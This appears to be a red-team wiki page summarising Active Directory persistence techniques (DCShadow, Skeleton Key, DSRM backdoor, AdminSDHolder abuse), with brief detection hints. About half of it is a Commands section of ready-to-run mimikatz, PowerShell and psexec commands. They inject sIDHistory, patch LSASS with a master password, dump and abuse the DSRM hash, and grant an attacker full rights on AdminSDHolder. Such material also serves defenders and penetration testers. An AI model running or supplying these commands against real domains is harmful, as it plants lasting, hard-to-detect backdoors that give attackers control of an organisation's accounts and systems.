---
title: AD Persistence — DCShadow, Skeleton Key, AdminSDHolder
type: source
created: 2026-06-13
updated: 2026-06-13
tags: [active-directory, persistence, domain-dominance]
source: raw/ad_persistence_dcshadow_skeletonkey_adminsdholder.md
---

# AD Persistence — DCShadow, Skeleton Key, AdminSDHolder

> Source: `raw/ad_persistence_dcshadow_skeletonkey_adminsdholder.md` (hideandsec.sh)

## Summary

Three post-domain-dominance persistence techniques, all requiring
DA-equivalent access already:

- **DCShadow** — register as a rogue replication partner and push
  attribute changes (sIDHistory, primaryGroupID, AdminSDHolder ACL,
  arbitrary attrs) directly via replication, avoiding normal write-audit
  events.
- **Skeleton Key** — patch LSASS on a DC to accept one master password for
  any account, in addition to its real password. Related: DSRM account
  abuse (`DSRMAdminLogonBehavior=2`) gives a DC-local backdoor account.
- **AdminSDHolder/SDProp** — write access to AdminSDHolder's ACL propagates
  an attacker-controlled ACE onto every protected group (Domain Admins,
  etc.) every SDProp cycle (~60 min), self-healing even if individually
  removed.

See [[ad-persistence]] (concept) for the consolidated detection guidance.

## Key points

- **DCShadow prereqs**: `DS-Replication-Get-Changes` +
  `DS-Replication-Get-Changes-All`, plus ability to register as a
  replication partner.
- **Skeleton Key prereqs**: DA + `SeDebugPrivilege` on the DC (LSASS
  injection).
- **Detection**: unexpected DC replication partners; non-default ACEs on
  `AdminSDHolder`/Domain Admins appearing after a quiet period; any
  non-zero `DSRMAdminLogonBehavior` on a DC.
- **Cross-link**: [[golden-silver-tickets]] and [[dcsync]] are the
  "first-visit" domain-dominance techniques that typically precede these
  persistence steps.

## Commands

```powershell
# --- DCShadow (run two mimikatz instances: one as "rogue DC" pushing, one driving) ---
# Instance 1 (push/RPC server side) — needs DA + SeDebugPrivilege
mimikatz # lsadump::dcshadow /object:victimuser /attribute:sIDHistory /value:S-1-5-21-<domain-sid>-519

# Instance 2 (driver — triggers the replication push)
mimikatz # lsadump::dcshadow /push
```

```powershell
# --- Skeleton Key ---
privilege::debug
misc::skeleton

# Then authenticate as ANY domain user with the master password "mimikatz"
net use \\dc01\c$ /user:corp\Administrator mimikatz
```

```powershell
# --- DSRM backdoor account ---
# Dump DSRM admin hash from a DC
privilege::debug
token::elevate
lsadump::sam

# Enable network logon for the DSRM account
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Force

# Then pass-the-hash as the DSRM account (local to that DC)
psexec.py -hashes :<dsrm_nthash> Administrator@dc01.corp.local
```

```powershell
# --- AdminSDHolder persistence ---
# Grant yourself GenericAll on AdminSDHolder (propagates to Domain Admins via SDProp)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity attacker -Rights All

# Force an immediate SDProp run instead of waiting ~60 min
Invoke-SDPropagation   # or trigger via rootDSE: ldap_modify on "fixupinheritance" / runProtectAdminGroupsTask

# Verify propagation landed on Domain Admins
(Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs) | Select-Object IdentityReference,ActiveDirectoryRights
```
